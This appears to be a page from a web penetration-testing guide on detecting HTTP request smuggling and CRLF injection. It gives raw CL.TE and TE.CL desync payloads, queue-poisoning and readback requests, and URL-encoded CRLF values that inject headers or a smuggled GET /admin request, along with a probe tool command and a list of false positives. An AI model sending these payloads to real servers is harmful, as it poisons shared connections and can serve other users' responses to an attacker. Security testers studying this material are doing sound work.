# Detection — finding the desync

## The detection problem — a desync is invisible until it isn't

A desync shows no direct signal — the smuggled prefix lands on the
NEXT request. Detection = a TIMING or DIFFERENTIAL or POISON signal.

## The timing oracle — the missing-GPOST hang

**CL.TE detector:**

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If the back-end honors TE: `0` ends the body, `G` starts an incomplete
request → the connection hangs waiting for the rest of `GPOST...` →
**the socket times out**.

If both agree on CL: `0\r\n\r\nG` = 6 bytes → normal response →
no hang.

**The timeout IS the signal** — a real desync delays the response —
but a timeout alone is `inconclusive`, never `confirms` — a timeout
could be a network blip. Repeat 3x; consistent hang + absent on
control = a desync signal.

## The differential oracle — the 404-poison

**TE.CL detector:**

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404-poison HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

If TE.CL works: the smuggled `GET /404-poison` executes → the NEXT
requester gets a **404** on a path that should 200 — or the next
response carries the 404's body. Send a second normal request →
if it returns 404 → the poison landed.

## The status-delta — the direct signal

`POST /` → 200 → `POST /` with the desync → the SECOND response is
404/500 — the back-end is answering the smuggled request.

## The `crlf_probe` — the fold-matrix

```bash
python3 tools/web/crlf_probe.py --url "http://t/page?host={M}" \
  --value "example.com"
```

`crlf_probe` fires the fold matrix — `%0d%0a` header-fold, `%0d%0a%0d%0a`
body-fold, lone `%0d`, lone `%0a`, double-encoded `%250d` — into the
value slot and grades each against the ordinary baseline: upstream-
error text, folded marker echo, or status delta. A 302, generic 400,
or timeout does not count.

## The double-request poison — the self-poison

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /poison HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

Then `GET /` → the GET's response carries the poison's output —
queue-poisoning — the smuggled POST lands in front of the next request.

## The reflected-param readback — the self-echo

If the app echoes a param — inject a smuggled request that puts your
param in the next request's path — the echo carries the readback:

```text
POST /search?q=x HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /search?q=POISONED HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The NEXT `/search` echoes `POISONED` — the readback confirms the smuggle.

## The header-injection fold — `name: value\r\nInjected: x`

```text
GET /page?host=example.com%0d%0aX-Injected:%201 HTTP/1.1
```

The `%0d%0a` folds a NEW header into the request — the upstream sees
`X-Injected: 1` — the header-injection fold — `crlf-injection.md`.

## The body-fold — `value\r\n\r\n<smuggled-request>`

```text
GET /page?host=example.com%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20t%0d%0a%0d%0a
```

`%0d%0a%0d%0a` folds the headers-body boundary — everything after is
a second request — the body-fold — `crlf-injection.md`.

## The upgrade-fold — `Upgrade: websocket` + smuggled frame

`upgrade-smuggling.md` — a protocol-upgrade sits in the path — the
smuggled frame lives in the upgraded tunnel.

## The "the response-pair" — the socket-accounting

Send the desync + a normal request on the SAME connection — count
the responses — a desync makes the back-end answer a request the front
never sent — the response-count is the oracle.

## The "the victim-poison" — the queue-poison

The smuggled prefix poisons the NEXT victim — a shared connection —
`response-poisoning.md` — the victim's response comes back to YOUR
socket.

## The negative-results — what does NOT confirm

- a 302 — redirect, not desync
- a generic 400 — rejection, not desync
- a timeout alone — could be congestion — needs 3x repetition +
  absent-on-control
- an echo of your input — reflection, not desync
- a folded-header echo — the fold landed but the smuggle may not have
